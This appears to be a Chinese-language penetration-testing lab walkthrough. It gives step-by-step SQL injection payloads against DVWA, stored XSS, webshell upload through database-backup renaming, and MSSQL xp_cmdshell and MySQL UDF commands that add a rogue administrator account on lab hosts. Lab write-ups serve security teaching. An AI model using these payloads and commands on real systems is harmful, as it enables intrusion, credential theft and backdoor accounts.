...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214929.png)
>
>3.在链接后面添加语句【union select 1,admin,password,4,5,6,7,8,9,10,11 from admin】，即可暴出管理员用户名和密码。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214853.png)
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214908.png)
>
>2.尝试输入’，返回错误，可以得知此处为注入点。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214916.png)
>
>3.尝试输入：`1 or 1=1`,想要遍历数据库表，并没有达成目的，猜测程序将此处看成了**字符型**。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214858.png)
>
>4.尝试输入：`1’ or’ 1’=’1`后遍历出了数据库中的所有内容。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214932.png)
>
>5.利用order by num语句来测试数据表有多少个字段。（--加空格）表示注释掉sql语句末尾的单引号。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214851.png)
>
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214857.png)
>
>8.通过注入：`1' and 1=2 union select user(),database() --`得到数据库用户以及数据库名称。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214919.png)
>
>9.通过注入：`1' and 1=2 union select version(),database() -- `得到数据库版本信息。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214930.png)
>
>10.通过注入：
>
>```
...
>获得操作系统信息。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214936.png)
>
>11.通过注入：`1' and 1=2 union select 1,schema_name from information_schema.schemata -- `查询所有数据库名字。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214855.png)
>
>12.通过注入：`1' and exists(select * from 表名) --`猜解dvwa数据库中的表名。测试表名为users。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214903.png)
>
>13.猜解字段名：`1' and exists(select 表名 from users) --`,测试的字段名为first_name,last_name。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214856.png)
>
>14.爆出数据库中字段的内容`1' and 1=2 union select first_name,last_name from users --`,这里其实如果是存放管理员账户的表，那么用户名，密码信息字段就可以爆出来了。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214935.png)

**源码分析：**

![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214904.png)
...
![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214937.png)
...
![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214927.png)
...
>1.注册一个用户。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706215643.png)
>
>2.来到“添加物品”处。此处是存在存储型XSS的。添加以下信息，点击“提交”。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706215644.png)
>
>3.点击“首页”，看到刚才添加的物品信息，点击打开。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706215649.png)
>
>4.弹出信息。说明漏洞存在。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706215645.png)
>
>5.再次编辑“添加物品”处提交的内容，其中“物品简介”项的内容如下：
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706215646.png)
>
>```javascript
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706215647.png)
>
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706215648.png)
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214912.png)
>
>3.交互界面返回信息。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214910.png)
>
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706215650.png)
>
>6.显示提交成功，我们继续提交下一段代码`<script>alert(/xss/)/*`来配合上一段代码执行。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214900.png)
>
>7.当管理员进入管理后台，进入留言管理，会触发用户输入的恶意代码，成功弹窗。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214859.png)
>
...
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214917.png)
>
> 3.打开【系统管理】下的【数据库备份】，即可进入数据库备份页面，并将刚刚得到的木马文件的路径复制到当前数据库路径中，填写数据库备份名称【ok.asp】。
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214934.png)
>
> 4.点击【确定】，即可得到数据库备份的路径【admin\Databackup\ok.asp.asa】。
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214852.png)
>
> 5.在火狐浏览器的地址栏中输入完整路径【`http://192.168.1.3:8002/admin/Databackup/ok.asp`】，即可访问木马，已经成功拿到webshell（密码：123456）。
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214933.png)
...
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214914.png)
>
> 2.判断fckeditor编辑器版本号，输入：`http://192.168.1.3:8001/FCKeditor/_whatsnew.html`，由返回页面可知此fckeditor编辑器版本为2.0。
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214931.png)
>
...
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214913.png)
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214901.png)
>
>2. 单击“端口扫描”->“开始扫描”, 发现**1433**端口开放，安装有mssql数据库。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214918.png)
>
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214925.png)
>
>4. 命令回显为1，cmd_shell为开启。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214909.png)
>
>5. 添加系统账号,在SQL操作命令中输入“Exec master.dbo.xp_cmdshell ‘net user hacker 123456 /add’”，没有回显表示命令成功。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214905.png)
>
>6. 在SQL操作命令中输入” Exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker /add’ “将hacker加入管理员组。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214926.png)
>
>7. 单击”scan”按钮，查看端口号。发现3389端口开启着。 *3389*是远程协助的端口。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214907.png)
>
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214902.png)
>
>2.单击“端口扫描”->“开始扫描”, 发现**3306**端口开放，安装有Mysql数据库。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214915.png)
>
>3.利用Mysql_udf提权，单击“mysql-udf提权”，在右侧输入已知的数据库连接用户名和密码（root:123456）,然后单击MYSQL连接即可。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214921.png)
>
>4.单击“安装DLL”按钮。
>
>5.在下拉列表框中选择”添加管理员”,单击”执行”按钮。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214924.png)
>
>6.在下拉列表框中选择”设为管理组”,单击”执行”按钮并加入管理员组。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214928.png)
>
>7.选择菜单栏中的“CMD命令”，下拉列表框中选择“net user”,然后单击“执行按钮”。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214923.png)
>
>8.选择菜单栏中的“CMD命令”，下拉列表框中选择“netstat -an”,然后单击“执行按钮”。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20220706214920.png)
>
